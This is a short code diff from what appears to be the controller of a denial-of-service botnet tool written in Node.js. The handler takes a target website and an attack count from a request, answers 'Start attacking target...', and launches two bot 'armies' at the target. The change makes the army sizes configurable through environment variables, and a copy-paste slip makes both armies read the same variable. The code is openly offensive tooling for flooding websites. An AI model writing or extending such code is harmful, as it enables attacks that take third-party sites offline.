@@ -16,11 +16,15 @@ class ControlControllers {
         try {
            const {websiteTarget, numberDos} = req.body
            res.end('OK! Start attacking target...')
-           console.log(process.env.URL_NGROK);
+           const army1 = process.env.NUM_ARMY1
+           const army2 = process.env.NUM_ARMY1
+           console.log(`Ngrok: ${process.env.URL_NGROK}`);
+           console.log(`Army 1: ${army1}`);
+            console.log(`Army 2: ${army2}`);
 
             await Promise.all([
-               armyBot.createArmy(websiteTarget, 2, numberDos),
-               armyBot.createArmy(websiteTarget, 2, numberDos),
+               armyBot.createArmy(websiteTarget, army1, numberDos),
+               armyBot.createArmy(websiteTarget, army2, numberDos),
             ])
             
             const response = await axios({
